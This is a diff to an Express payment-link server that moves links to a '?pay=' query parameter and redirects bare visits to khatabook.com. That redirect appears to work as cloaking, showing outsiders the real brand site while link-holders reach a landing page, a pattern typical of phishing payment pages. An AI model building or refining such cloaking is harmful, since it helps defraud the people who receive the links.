@@ -43,12 +43,21 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Add this route to redirect direct visitors to khatabook.com
+// Special handling for the root path
 app.get('/', (req, res, next) => {
-  // Only redirect if it's a direct visit without any query parameters
-  if (!Object.keys(req.query).length) {
+  // Check if payment ID exists in query params
+  const paymentId = req.query.pay;
+  
+  if (paymentId && paymentLinks.has(paymentId)) {
+    // If valid payment ID, redirect to landing page
+    return res.redirect(`/landing.html?pid=${paymentId}`);
+  }
+  
+  // If no valid payment ID, and no other query params, redirect to khatabook
+  if (Object.keys(req.query).length === 0) {
     return res.redirect('https://www.khatabook.com');
   }
+  
   next();
 });
 
@@ -65,7 +74,7 @@ const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Modified Payment Links Endpoint - use path instead of subdomain
+// Simplest approach: just use a query parameter instead of subdomain or path
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -80,12 +89,12 @@ app.post('/api/generatePaymentLink', (req, res) => {
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     
-    // Get protocol and host
+    // Get protocol and host from request
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const host = req.get('host');
     
-    // Create payment link using /pay/ path instead of subdomain
-    const paymentLink = `${protocol}://${host}/payment/${invoiceId}`;
+    // Create payment link using simple query parameter
+    const paymentLink = `${protocol}://${host}/?pay=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -99,17 +108,6 @@ app.post('/api/generatePaymentLink', (req, res) => {
     console.error('Payment Link Error:', error);
     res.status(500).json({ status: "error", message: "Internal server error" });
   }
-});
-
-// Add a new route to handle the /payment/:id pattern
-app.get('/payment/:id', (req, res) => {
-  const invoiceId = req.params.id;
-  if (!paymentLinks.has(invoiceId)) {
-    return res.redirect('/'); // Redirect to home if ID not found
-  }
-  
-  // Redirect to landing page with pid parameter
-  res.redirect(`/landing.html?pid=${invoiceId}`);
 });
 
 // The rest of your code remains completely unchanged
